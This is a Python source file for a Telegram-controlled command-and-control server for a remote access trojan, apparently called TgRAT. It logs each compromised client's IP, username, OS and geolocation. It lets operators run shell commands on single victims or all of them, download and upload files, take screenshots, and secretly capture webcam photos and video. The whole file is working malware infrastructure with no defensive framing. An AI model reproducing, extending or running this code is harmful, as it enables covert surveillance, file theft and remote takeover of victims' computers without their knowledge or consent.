import telebot
from telebot import util as telebot_util
import sqlite3
import socket
import threading
import signal
import time
import base64
import requests
import os
from termcolor import colored
from dotenv import load_dotenv
from Crypto.Cipher import AES
import json
from Crypto.Util.Padding import pad, unpad
from telebot.types import ChatPermissions

load_dotenv()

SECRET_KEY = b'0123456789abcdef0123456789abcdef'
TOKEN = os.getenv("BOT_TOKEN")
C2_CHANNEL_ID = os.getenv("CHAT_ID")
C2_SERVER_IP = "0.0.0.0"
C2_SERVER_PORT = 9090
bot = telebot.TeleBot(TOKEN)

banner = colored(r"""
  ______      ____  ___  ______
 /_  __/___ _/ __ \/   |/_  __/
  / / / __ `/ /_/ / /| | / /   
 / / / /_/ / _, _/ ___ |/ /    
/_/  \__, /_/ |_/_/  |_/_/     
    /____/     

By tay
""", 'blue')

class ClientSession:

    def __init__(self, socket, address):
        self.socket = socket
        self.address = address
        self.ip = address[0]
        self.username = None
        self.os_version = None
        self.topic_id = None
        self.last_topic_id = None

    def close(self):
        try:
            self.socket.close()
        except Exception as e:
            print(f"[!] Error closing the connection with {self.ip}: {e}")

class C2Server:

    def __init__(self):
        self.clients = {}
        self.active_shell_sessions = {}
        self.server = None
        self.logging_enabled = False
        self.log_topic_id = None

        signal.signal(signal.SIGINT, self.shutdown)
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect("agents.db")
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id TEXT,
            ip TEXT,
            username TEXT,
            topic_id INTEGER,
            country TEXT,
            city TEXT,
            os TEXT,
            country_code TEXT,
            last_seen INTEGER)''')

        conn.commit()
        conn.close()

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((C2_SERVER_IP, C2_SERVER_PORT))
        self.server.listen(5)
        print(banner)
        print(colored(f"[C2] Server listening for connections in {C2_SERVER_IP}:{C2_SERVER_PORT}...", 'blue'))
        bot.send_message(C2_CHANNEL_ID, f"🚀 C2 Server Started at {C2_SERVER_IP}:{C2_SERVER_PORT} 🚀\n\n" 
                    f"ℹ️ *Global Commands* ℹ️\n"
                    f"- */shutdown* - Shut down server\n"
                    f"- */clean* -  Deletes duplicate or inactive (48h+) clients and their topics\n"
                    f"- */logs* -  Start/Stop the logging system in a channel named Logs\n"
                    f"- */listclients* - List all registered clients\n"
                    f"- */sendall* <command> - Execute in the command in all the clients\n"
                    f"- */statusall* - Check status for every client\n"
                    f"- */photoall* - Take a photo from all clients\n",

        parse_mode="Markdown")

        while True:
            try:
                client_socket, client_address = self.server.accept()
                print(colored(f"[+] New connection {client_address}", 'green'))
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, client_address), daemon=True)
                client_thread.start()
            except Exception as e:
                print(colored(f"[C2] Error with the connection: {e}", 'red'))

    def init_logs_topic(self):
        try:
            response = bot.create_forum_topic(C2_CHANNEL_ID, "📝 Logs")
            self.log_topic_id = response.message_thread_id
        except Exception as e:
            print(colored(f"[!] Error creating log topic: {e}", 'red'))

    def log(self, text):
        if not self.logging_enabled or not self.log_topic_id:
            return
        try:
            timestamp = time.strftime('%d-%m-%Y %H:%M:%S', time.localtime())
            bot.send_message(
                C2_CHANNEL_ID,
                f"[`{timestamp}`] {text}",
                message_thread_id=self.log_topic_id,
                parse_mode="Markdown"
            )
        except Exception as e:
            print(f"[!] Error logging: {e}")

    def get_info_ip(self, ip):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}").json()
            country = response.get("country", "Unknown")
            country_code = response.get("countryCode", "UN")
            city = response.get("city", "Unknown")
            zip_code = response.get("zip", "Unknown")
            regionName = response.get("regionName", "Unknown")
            isp1 = response.get("as", "Unknown")
            isp2 = response.get("isp", "Unknown")
            return country, country_code, city, zip_code, regionName, isp1, isp2
        except Exception:
            return "Unknown", "UN", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"

    def country_flag(self, code):
        if not code or len(code) != 2:
            return ""
        return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)
        
    def handle_client(self, client_socket, client_address):
        try:
            session = ClientSession(client_socket, client_address)

            data = self.recv_all(client_socket)
            if not data:
                session.close()
                return

            decrypted = self.decrypt_message(data)
            info_msg = json.loads(decrypted)

            if info_msg.get("type") != "info":
                session.close()
                return

            session.username, session.os_version = info_msg["data"].split("|")

            conn = sqlite3.connect("agents.db")
            cursor = conn.cursor()

            cursor.execute("SELECT topic_id FROM clients WHERE ip = ?", (session.ip,))
            existing = cursor.fetchone()
            if existing:
                old_topic_id = existing[0]
                try:
                    if old_topic_id:
                        bot.delete_forum_topic(C2_CHANNEL_ID, old_topic_id)
                except Exception as e:
                    print(f"[!] Error deleting old topic for {session.ip}: {e}")
                cursor.execute("DELETE FROM clients WHERE ip = ?", (session.ip,))

            topic_title = f"Client {session.username} ({session.ip})"
            response = bot.create_forum_topic(C2_CHANNEL_ID, topic_title)
            session.topic_id = response.message_thread_id

            country, country_code, city, zip_code, regionName, isp1, isp2 = self.get_info_ip(session.ip)

            cursor.execute("""
                INSERT INTO clients (telegram_id, ip, username, topic_id, country, city, os, country_code, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                session.ip, session.ip, session.username, session.topic_id,
                country, city, session.os_version, country_code, int(time.time())
            ))

            conn.commit()
            conn.close()

            self.clients[session.ip] = session

            help_message = (
                "ℹ️ *Client commands:*\n"
                "- `/delete` - Delete topic\n"
                "- `/kill` - Kills the connection with the client\n"
                "- `/status` - Check if the client is online\n"
                "- `/shell <command>` - Execute command in the client\n\n"
                "🖥️ *Screen Commands:*🖥️\n"
                "- `/screenshot` - Take a screenshot and send it here\n\n"
                "📂 *Files Commands:* 📂\n"
                "- `/download <file_path>` - Download a file from the client\n"
                "- `/upload <file_path>` - Upload a file from the server to the client\n"
                "- `Also you can send a file directly in the chat to the client`\n\n"
                "📷 *Web cam commands:* 📷\n"
                "- `/listwebcams` - List availables webcams\n"
                "- `/photo <camera index>` - captures a image from the camera and send it here\n"
                "- `/video <camera index> <duration> <fps>` - captures a image from the camera and send it here\n"
            )
            ip_info = self.get_info_ip(session.ip)
            username = self.escape_markdown_v2(session.username)
            os_version = self.escape_markdown_v2(session.os_version)
            self.log(f"New client `{session.ip}` connected as *{session.username}* ({session.os_version})")
            bot.send_message(C2_CHANNEL_ID, f"ℹ️ *New Connection* ℹ️\n"
                f"- *User:* {username}\n"
                f"- *IP:* {session.ip}\n"
                f"- *Country:* {ip_info[0]}\n"
                f"- *Country Code:* {ip_info[1]}\n"
                f"- *City:* {ip_info[2]}\n"
                f"- *Zip Code:* {ip_info[3]}\n"
                f"- *Region:* {ip_info[4]}\n"
                f"- *ISP:* {ip_info[5]} - {ip_info[6]}\n"
                f"- *OS:* {os_version}\n"
                f"- *Topic:* {topic_title}",
                parse_mode="Markdown")

            bot.send_message(C2_CHANNEL_ID, help_message, parse_mode="Markdown", message_thread_id=session.topic_id)

            threading.Thread(target=self.recv_loop, args=(session,), daemon=True).start()

        except Exception as e:
            print(colored(f"Error with the client {client_address}: {e}", 'red'))

    def escape_markdown_v2(self, text):
        escape_chars = r'_*[]()~`>#+-=|{}.!'
        return ''.join(f'\\{c}' if c in escape_chars else c for c in text)

    def recv_loop(self, session):
        while True:
            try:
                data = self.recv_all(session.socket)
                if not data:
                    print(colored(f"[!] Client {session.ip} disconected.", 'red'))
                    session.close()
                    del self.clients[session.ip]
                    return

                msg = json.loads(self.decrypt_message(data))
                msg_type = msg.get("type")
                payload = msg.get("data")

                topic_id = session.last_topic_id or session.topic_id

                if msg_type == "heartbeat":
                    timestamp = int(time.time())
                    conn = sqlite3.connect("agents.db")
                    cursor = conn.cursor()
                    cursor.execute("UPDATE clients SET last_seen = ? WHERE ip = ?", (timestamp, session.ip))
                    conn.commit()
                    conn.close()
                    print(colored(f"[HeartBeat] {session.ip}", "cyan"))


                elif msg_type == "status":
                    target_topic = getattr(session, "last_topic_id", session.topic_id)
                    if payload.strip().lower() == "online":
                        bot.send_message(C2_CHANNEL_ID, f"✅ {session.ip} - *ONLINE*", message_thread_id=target_topic, parse_mode="Markdown")
                    else:
                        bot.send_message(C2_CHANNEL_ID, f"❌ {session.ip} - *OFFLINE*", message_thread_id=target_topic, parse_mode="Markdown")

                elif msg_type == "screenshot":
                    self.recv_img(f"[screenshot]{payload}", topic_id)

                elif msg_type == "photo":
                    self.recv_webcam(f"[photo] {payload}", topic_id, session.ip)

                elif msg_type == "video":
                    self.recv_video(f"[video] {payload}", topic_id)

                elif msg_type == "file":
                    file_b64, name = payload.split("|", 1)
                    self.recv_file(f"[download] {file_b64} {name}", topic_id)

                elif msg_type == "response":
                    if len(payload) > 4000:
                        payload = payload[:4000] + "\n[...truncated]"
                    
                    if topic_id == session.topic_id:
                        msg = payload
                    else:
                        msg = f"📬 `{session.ip}`:\n{payload}"

                    bot.send_message(
                        C2_CHANNEL_ID,
                        msg,
                        message_thread_id=topic_id,
                        parse_mode="Markdown"
                    )

                else:
                    bot.send_message(C2_CHANNEL_ID, f"❌ Unknown message type from {session.ip}", message_thread_id=topic_id)

            except Exception as e:
                print(colored(f"[!] Error in connection with {session.ip}: {e}", 'red'))
                session.close()
                if session.ip in self.clients:
                    del self.clients[session.ip]
                return


    def handle_command(self, message):

        if message.message_thread_id is None:
            self.handle_global_command(message)
            return

        conn = sqlite3.connect("agents.db")
        cursor = conn.cursor()
        cursor.execute("SELECT ip FROM clients WHERE topic_id = ?", (message.message_thread_id,))
        client = cursor.fetchone()
        conn.close()
        
        if not client:
            return
        
        client_ip = client[0]
        text = message.text.lower()

        if text == "/status":
            self.check_bot_status(client_ip, message.message_thread_id)
            return

        elif text.startswith("/shell"):
            command = text.replace("/shell ", "")
            self.send_command_to_client(self.clients[client_ip], command, message.message_thread_id)

        elif text == "/delete":
            bot.delete_forum_topic(C2_CHANNEL_ID, message.message_thread_id)

        elif text == "/screenshot":
            bot.send_message(C2_CHANNEL_ID, "🎞️ Taking screenshot...", message_thread_id=message.message_thread_id)
            self.send_command_to_client(self.clients[client_ip], "screenshot", message.message_thread_id)

        elif text.startswith("/download"):
            file = text.replace("/download ", "")
            self.send_command_to_client(self.clients[client_ip], file, message.message_thread_id, force_type="download")

        elif text.startswith("/upload"):
            bot.send_message(C2_CHANNEL_ID, "📁 Uploading file...", message_thread_id=message.message_thread_id)
            self.send_file(self.clients[client_ip], text.replace("/upload ", ""), message.message_thread_id)

        elif text == "/kill":
            self.kill(message, self.clients[client_ip])

        elif text == "/listwebcams":
            self.send_command_to_client(self.clients[client_ip], "listwebcams", message.message_thread_id)

        elif text.startswith("/photo"):
            cmd = text.replace("/photo ", "")
            bot.send_message(C2_CHANNEL_ID, "📸 Taking photo...", message_thread_id=message.message_thread_id)
            self.send_command_to_client(self.clients[client_ip], cmd, message.message_thread_id, force_type="photo")

        elif text.startswith("/video"):
            self.video(text, self.clients[client_ip], message)

    def handle_global_command(self, message):
        text = message.text.lower()

        self.log(f"🌍 Global command: `{text}`")

        if text == "/shutdown":
            self.shutdown_server()

        elif text.startswith("/sendall"):
            self.sendall(text)
            
        elif text == "/clean":
            self.clean()

        elif text == "/statusall":
            self.statusall()

        elif text == "/listclients":
            self.list_clients()

        elif text == "/photoall":
            self.photoall(message)
        
        elif text == "/logs":
            self.start_logging()

    def start_logging(self):
        if self.logging_enabled:
            self.logging_enabled = False
            bot.send_message(C2_CHANNEL_ID, "❌ Logging desactivado.")
        else:
            if not self.log_topic_id:
                try:
                    response = bot.create_forum_topic(C2_CHANNEL_ID, "📝 Logs")
                    self.log_topic_id = response.message_thread_id
                    bot.send_message(C2_CHANNEL_ID, "📌 Canal de logs creado.")
                except Exception as e:
                    bot.send_message(C2_CHANNEL_ID, f"❌ Error creando el topic de logs: {e}")
                    return
            self.logging_enabled = True
            bot.send_message(C2_CHANNEL_ID, "✅ Logging activado correctamente.")

    def statusall(self):
        bot.send_message(C2_CHANNEL_ID, "⏳ Checking status of all clients...")

        for ip, session in list(self.clients.items()):
            try:
                self.send_command_to_client(session, "checkstatus", 0, force_type="checkstatus")
            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
                bot.send_message(C2_CHANNEL_ID, f"❌ {ip} DISCONNECTED")
                session.close()
                del self.clients[ip]
            except Exception as e:
                bot.send_message(C2_CHANNEL_ID, f"⚠️ {ip} Error: {e}")

    def clean(self):
        try:
            conn = sqlite3.connect("agents.db")
            cursor = conn.cursor()
            cursor.execute("SELECT ip, topic_id, last_seen FROM clients ORDER BY last_seen DESC")
            rows = cursor.fetchall()

            seen_ips = set()
            removed_count = 0
            now = int(time.time())
            offline_threshold = 60 * 60 * 48

            for ip, topic_id, last_seen in rows:
                is_active = ip in self.clients
                is_duplicate = ip in seen_ips
                is_offline = (not last_seen or now - last_seen > offline_threshold)

                if is_duplicate:
                    try:
                        if topic_id:
                            self.log(f"🗑️ Removed {'duplicate' if is_duplicate else 'inactive'} client `{ip}`")
                            bot.delete_forum_topic(C2_CHANNEL_ID, topic_id)
                        cursor.execute("DELETE FROM clients WHERE ip = ? AND topic_id = ?", (ip, topic_id))
                        removed_count += 1
                    except Exception as e:
                        print(f"[!] Error deleting duplicate topic {topic_id}: {e}")
                    continue

                seen_ips.add(ip)

                if is_offline and not is_active:
                    try:
                        if topic_id:
                            bot.delete_forum_topic(C2_CHANNEL_ID, topic_id)
                            self.log(f"🗑️ Removed {'duplicate' if is_duplicate else 'inactive'} client `{ip}`")
                        cursor.execute("DELETE FROM clients WHERE ip = ? AND topic_id = ?", (ip, topic_id))
                        removed_count += 1
                    except Exception as e:
                        print(f"[!] Error deleting inactive topic {topic_id}: {e}")

            conn.commit()
            conn.close()

            bot.send_message(C2_CHANNEL_ID, f"🧹 Cleaned up `{removed_count}` agents (duplicates or inactive).", parse_mode="Markdown")
            self.log(f"✅ Cleaned {removed_count} agents (duplicates/inactive)")
        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"❌ Error during cleanup: {e}")


    def shutdown_server(self):
        bot.send_message(C2_CHANNEL_ID, "❌ Shutting down the sever...")
        import os, signal
        os.kill(os.getpid(), signal.SIGINT)

    def kill(self, message, client_session):
        client_ip = client_session.ip
        if client_ip in self.clients:
            self.send_command_to_client(client_session, "kill", message.message_thread_id)
            client_session.close()
            del self.clients[client_ip]
            self.log(f"💀 Killed client `{client_ip}`")
            bot.send_message(C2_CHANNEL_ID, f"💀 Client `{client_ip}` has been killed.", parse_mode="Markdown", message_thread_id=message.message_thread_id)
        else:
            bot.send_message(C2_CHANNEL_ID, f"❌ Client not found.", message_thread_id=message.message_thread_id)

    def photoall(self, message):
        bot.send_message(C2_CHANNEL_ID, "📸 Taking photo from all clients...")

        for ip, session in list(self.clients.items()):
            try:
                self.send_command_to_client(session, "0", None, force_type="photo")
            except Exception as e:
                bot.send_message(C2_CHANNEL_ID, f"❌ Error taking photo from {ip}: {e}")

    def video(self, text, client_session, message):
        bot.send_message(C2_CHANNEL_ID, "🎥 Recording Video...", message_thread_id=message.message_thread_id)
        client_ip = client_session.ip
        args = text.split()
        if len(args) >= 2:
            payload = " ".join(args[1:])
            self.send_command_to_client(self.clients[client_ip], payload, message.message_thread_id, force_type="video")
        else:
            bot.send_message(C2_CHANNEL_ID, "⚠️ Usage: /video <cam_index> [duration] [fps]", message_thread_id=message.message_thread_id)

    def send_file(self, client_socket, file, topic_id):
        try:
            if os.path.exists(file):
                with open(file, "rb") as f:
                    content = f.read()
                    encoded = base64.b64encode(content).decode("utf-8")
                    command = json.dumps({
                        "filename": file,
                        "content": encoded
                    })
            else:
                command = f"[!] The file {file} does not exist."
            self.send_command_to_client(client_socket, command, topic_id)
        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"❌ Error sending the file: {e}")

    def sendall(self, text):
        command = text.replace("/sendall ", "")
        self.log(f"📡 Broadcasting command `{command}` to all clients")
        bot.send_message(C2_CHANNEL_ID, f"⏳ Sending command to all bots...")

        for ip, session in self.clients.items():
            try:
                self.send_command_to_client(session, command, None)
                bot.send_message(C2_CHANNEL_ID, f"✅ Sent to {ip}")
            except Exception as e:
                bot.send_message(C2_CHANNEL_ID, f"[{ip}] Error: {e}")

    def check_bot_status(self, client_ip, message_thread_id):
        session = self.clients.get(client_ip)

        if not session:
            bot.send_message(C2_CHANNEL_ID, "❌ Client Offline", message_thread_id=message_thread_id)
            return

        try:
            bot.send_message(C2_CHANNEL_ID, "⏳ Checking client status...", message_thread_id=message_thread_id)
            self.send_command_to_client(session, "checkstatus", message_thread_id, force_type="checkstatus")
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
            bot.send_message(C2_CHANNEL_ID, f"❌ Client *DISCONNECTED*", message_thread_id=message_thread_id, parse_mode="Markdown")
            self.log(f"🔌 Client `{session.ip}` disconnected")
            print(colored(f"[!] Client {client_ip} disconnected: {e}", 'red'))
            session.close()
            del self.clients[client_ip]
        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"❌ Error checking client status: {e}", message_thread_id=message_thread_id)


    def send_command_to_client(self, client_socket, command, topic_id, force_type=None):
        try:
            self.log(f"Sent `{command}` to `{client_socket.ip}`")
            if topic_id is None:
                client_socket.last_topic_id = C2_CHANNEL_ID 
            else:
                client_socket.last_topic_id = topic_id

            msg = {
                "type": force_type if force_type else self.get_command_type(command),
                "agent_id": client_socket.username,
                "data": command.strip()
            }
            encrypted = self.encrypt_message(json.dumps(msg))
            client_socket.socket.send(self.prepare_packet(encrypted))
        except Exception as e:
            target_topic = topic_id or C2_CHANNEL_ID
            bot.send_message(C2_CHANNEL_ID, f"❌ Error sending command: {e}", message_thread_id=target_topic)


    def get_command_type(self, cmd):
        if cmd.startswith("shell") or cmd.startswith("whoami"):
            return "command"
        elif cmd.startswith("screenshot"):
            return "screenshot"
        elif cmd.startswith("photo"):
            return "photo"
        elif cmd.startswith("video"):
            return "video"
        elif cmd.startswith("listwebcams"):
            return "listwebcams"
        elif cmd.startswith("download"):
            return "download"
        elif cmd.startswith("upload"):
            return "upload"
        elif cmd.startswith("kill"):
            return "kill"
        elif cmd.startswith("checkstatus"):
            return "checkstatus"
        return "command"

    def get_command_prefix(self, cmd):
        return cmd.split()[0]

    def prepare_packet(self, encrypted: bytes) -> bytes:
        return str(len(encrypted)).zfill(10).encode() + encrypted

    def recv_file(self, response, topic_id):
        args = response.split()
        file_data = args[1]
        file_name = args[2]
        file_bytes = base64.b64decode(file_data)

        with open(file_name, "wb") as f:
            f.write(file_bytes)

        with open(file_name, "rb") as file:
            bot.send_document(C2_CHANNEL_ID, file, caption="📁 File received", message_thread_id=topic_id)
            os.remove(file_name)

    def recv_webcam(self, response, topic_id, ip="Unknown"):
        img_data = response.replace("[photo] ", "")
        img_bytes = base64.b64decode(img_data)

        with open("webcam.jpg", "wb") as f:
            f.write(img_bytes)

        with open("webcam.jpg", "rb") as photo:
            bot.send_photo(
                C2_CHANNEL_ID,
                photo,
                caption=f"📸 Photo from `{ip}`",
                message_thread_id=topic_id,
                parse_mode="Markdown"
            )
            os.remove("webcam.jpg")

    def recv_img(self, response, topic_id):
        image_data = response.replace("[screenshot]", "")
        image_bytes = base64.b64decode(image_data)

        with open("screenshot.png", "wb") as f:
            f.write(image_bytes)

        with open("screenshot.png", "rb") as photo:
            bot.send_photo(C2_CHANNEL_ID, photo, caption="📸 Screenshot received", message_thread_id=topic_id)
            os.remove("screenshot.png")

    def recv_video(self, response, topic_id):
        video_data = response.replace("[video] ", "")
        video_bytes = base64.b64decode(video_data)

        with open("webcam.mp4", "wb") as f:
            f.write(video_bytes)

        with open("webcam.mp4", "rb") as video:
            bot.send_video(C2_CHANNEL_ID, video, caption="🎥 Webcam video", message_thread_id=topic_id)
            os.remove("webcam.mp4")


    def recv_all(self, sock):
        size_data = b""
        while len(size_data) < 10:
            part = sock.recv(10 - len(size_data))
            if not part:
                return b""
            size_data += part

        try:
            total_size = int(size_data.decode("utf-8").strip())
        except ValueError:
            return b""

        data = b""
        while len(data) < total_size:
            part = sock.recv(min(4096, total_size - len(data)))
            if not part:
                break
            data += part

        return data


    def encrypt_message(self, message: str) -> bytes:
        iv = os.urandom(16)
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
        return base64.b64encode(iv + encrypted)

    def decrypt_message(self, encrypted_message: bytes) -> str:
        try:
            if not encrypted_message or len(encrypted_message) < 16:
                return "❌ Error decrypting message: empty or invalid data"
            
            raw = base64.b64decode(encrypted_message)
            if len(raw) < 16:
                return "❌ Error decrypting message: invalid IV"

            iv = raw[:16]
            encrypted = raw[16:]
            cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
            return decrypted.decode()
        except Exception as e:
            return f"❌ Error decrypting message: {e}"

    def list_clients(self):
        try:
            conn = sqlite3.connect("agents.db")
            cursor = conn.cursor()
            cursor.execute("SELECT DISTINCT ip, username, last_seen, country, city, country_code FROM clients ORDER BY last_seen DESC")
            rows = cursor.fetchall()
            conn.close()

            if not rows:
                bot.send_message(C2_CHANNEL_ID, "❌ No hay agentes registrados.")
                return

            msg = "🧠 *Registered Agents:* 🧠\n\n"
            for ip, username, last_seen, country, city, code in rows:
                last_seen_fmt = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_seen)) if last_seen else "N/A"
                flag = self.country_flag(code)
                msg += (
                    f"{flag} `{ip}`\n"
                    f"├── User      : {username or 'Unknown'}\n"
                    f"├── Country   : {country}\n"
                    f"├── City      : {city}\n"
                    f"├── Last Seen : {last_seen_fmt}\n\n"
                )
                
            bot.send_message(C2_CHANNEL_ID, msg, parse_mode="Markdown")

        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"❌ Error listing clients: {e}")

    def shutdown(self, sig, frame):
        self.log("🛑 Shutting down the server")
        print(colored("\n[!] Shuting Down the server...", 'red'))
        print("\033[?25h", end="", flush=True)
        if self.server:
            self.server.close()
        for session in self.clients.values():
            session.close()
        bot.stop_polling()
        exit(0)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    bot.send_message(C2_CHANNEL_ID, "📁 Uploading File...", message_thread_id=message.message_thread_id)
    if not message.message_thread_id:
        bot.reply_to(message, "❌ This file needs to be sended to a client.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_data_b64 = base64.b64encode(downloaded_file).decode()
        file_name = message.document.file_name

        conn = sqlite3.connect("agents.db")
        cursor = conn.cursor()
        cursor.execute("SELECT ip FROM clients WHERE topic_id = ?", (message.message_thread_id,))
        result = cursor.fetchone()
        conn.close()

        if not result:
            bot.reply_to(message, "❌ No client for this thread.")
            return

        client_ip = result[0]
        session = c2.clients.get(client_ip)

        if not session:
            bot.reply_to(message, "❌ Cliente offline.")
            return

        command = json.dumps({
            "filename": file_name,
            "content": file_data_b64
        })
        c2.log(f"📁 Sent file `{file_name}` to `{client_ip}`")
        c2.send_command_to_client(session, command, message.message_thread_id, force_type="upload")

    except Exception as e:
        bot.reply_to(message, f"❌ Error while processing the file: {e}")


if __name__ == "__main__":
    try:
        print("\033[?25l", end="", flush=True)
        c2 = C2Server()
        bot.message_handler(func=lambda message: True)(c2.handle_command)
        threading.Thread(target=c2.start_server, daemon=True).start()
        bot.polling()
    except Exception as e:
        print("\033[?25h", end="", flush=True)
        print(colored(f"[!] Error: {e}", 'red'))
